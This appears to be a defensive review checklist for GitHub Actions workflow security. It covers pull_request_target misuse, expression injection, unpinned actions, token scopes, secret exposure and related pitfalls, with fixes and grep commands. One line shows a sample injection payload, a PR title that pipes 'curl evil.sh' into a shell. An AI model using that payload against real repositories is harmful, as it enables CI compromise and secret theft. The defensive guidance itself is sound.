# GitHub Actions workflows

Read this first for any workflow, reusable workflow or composite action. The first five
entries are the ones to settle before anything else. Every entry: **Bites**, **Spot**, **Fix**.

## Contents

- Lead patterns: PR code under `pull_request_target`, expression injection, unpinned actions,
  token permissions, secrets reachable from forks
- Further patterns: reusable workflow and composite inputs, `workflow_run` artifacts,
  self-hosted runners, caches, `GITHUB_ENV`/`GITHUB_PATH`, `continue-on-error`, persisted
  checkout credentials
- Grep set

## Lead patterns

### PR code run under `pull_request_target`

- **Bites:** `pull_request_target` runs in the base repository's context, with its token and
  secrets. Checking out the PR head and then building, installing or testing it runs fork code
  with those privileges.
- **Spot:** `on: pull_request_target` together with `actions/checkout` whose `ref:` is
  `github.event.pull_request.head.sha`, `head.ref` or `refs/pull/<n>/merge`, followed by any
  step that executes the checkout.
- **Fix:** run untrusted code under `pull_request` (no secrets, read-only token); keep
  `pull_request_target` for jobs that never execute PR content, such as labelling.

### Event data expanded inside `run:`

- **Bites:** `${{ }}` is substituted into the script before the shell runs, so a PR title like
  `"; curl evil.sh | sh #` becomes code.
- **Spot:** `${{ github.event.* }}`, `github.head_ref`, issue or comment bodies, or
  `inputs.*` inside `run:` or `script:`.
- **Fix:** pass the value through `env:` and use the quoted shell variable:

```yaml
- name: Show the title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: printf '%s\n' "$PR_TITLE"
```

### Actions referenced by tag or branch

- **Bites:** `@v3` or `@main` is mutable. Whoever controls that repository decides what runs in
  your job next time.
- **Spot:** `uses:` lines whose ref is not a 40-character commit SHA. Third-party actions first,
  first-party (`actions/*`) after.
- **Fix:** pin to the full SHA with the version as a trailing comment, and let a dependency bot
  update it.

### Token permissions left at the default

- **Bites:** without a `permissions:` block the `GITHUB_TOKEN` gets the repository default,
  which may be write access to contents, packages and PRs; `write-all` grants everything.
- **Spot:** no `permissions:` at workflow or job level; `write-all`; write scopes the job never
  uses.
- **Fix:** `permissions: {}` or `contents: read` at the top, and per-job grants for what each
  job actually writes.

### Secrets within reach of fork code

- **Bites:** a secret referenced in a job that runs PR code under `pull_request_target` or
  `workflow_run`, a step `env:` holding a secret next to a PR build, or `secrets: inherit`
  handing every secret to a called workflow.
- **Spot:** where each `secrets.*` is referenced against the trigger and the code that job runs.
- **Fix:** keep secrets in jobs that run only trusted code; pass named secrets instead of
  `inherit`; protected environments with required reviewers.

## Further patterns

### Inputs of reusable workflows and composite actions

- **Bites:** `inputs.*` forwarded into a shell step is the same injection as above, one level
  removed; secrets passed as plain inputs show up unmasked.
- **Spot:** `inputs.` inside `run:` of a reusable workflow or `action.yml`.
- **Fix:** route inputs through `env:`; declare secrets under `secrets:`, not `inputs:`.

### `workflow_run` trusting fork artifacts

- **Bites:** the privileged follow-up workflow downloads an artifact produced by a fork's run
  and executes or interprets it.
- **Spot:** `on: workflow_run` with `download-artifact` followed by execution or `GITHUB_ENV`
  writes.
- **Fix:** treat the artifact as data, validate it, and never run it.

### Self-hosted runners on public repositories

- **Bites:** PR code runs on a persistent machine that keeps state between jobs.
- **Spot:** `runs-on: self-hosted` (or custom labels) in workflows triggered by PRs.
- **Fix:** GitHub-hosted or ephemeral runners for anything that runs fork code.

### Cache shared across trust levels

- **Bites:** a PR job writes a cache entry that the default-branch build later restores.
- **Spot:** identical cache keys in PR and release jobs.
- **Fix:** separate key prefixes; do not restore PR-written caches in privileged jobs.

### Untrusted values in `GITHUB_ENV` or `GITHUB_PATH`

- **Bites:** writing PR-controlled text into these files sets environment variables such as
  `LD_PRELOAD` or prepends a path for every later step.
- **Spot:** `>> "$GITHUB_ENV"` or `>> "$GITHUB_PATH"` with event or artifact data.
- **Fix:** write only fixed names with validated values.

### Security steps allowed to fail

- **Bites:** `continue-on-error: true` on a scanner, or an `if:` that skips it on some branches,
  turns the gate into decoration.
- **Spot:** those keys on scan, signature or policy steps.
- **Fix:** let the step fail the job; handle known noise in the tool's own configuration.

### Checkout credentials left behind

- **Bites:** `actions/checkout` stores the token in `.git/config` by default, so later steps
  and uploaded workspaces can read it.
- **Spot:** checkout without `persist-credentials: false` in jobs that run third-party code or
  upload the workspace.
- **Fix:** `persist-credentials: false` unless a later step pushes.

## Grep set

```bash
grep -rn -E 'pull_request_target|workflow_run' .github/workflows
grep -rn -E '\$\{\{ *(github\.event\.|github\.head_ref|inputs\.)' .github
grep -rn -E 'uses: *[^ ]+@' .github
grep -rn -E '^ *permissions:|write-all' .github/workflows
grep -rn -E 'secrets: inherit|secrets\.' .github
```

From the third search, drop refs that are 40 hex characters; the rest are mutable. A workflow
file with no `permissions:` line produces no hit in the fourth search, so list the workflow
files and compare.
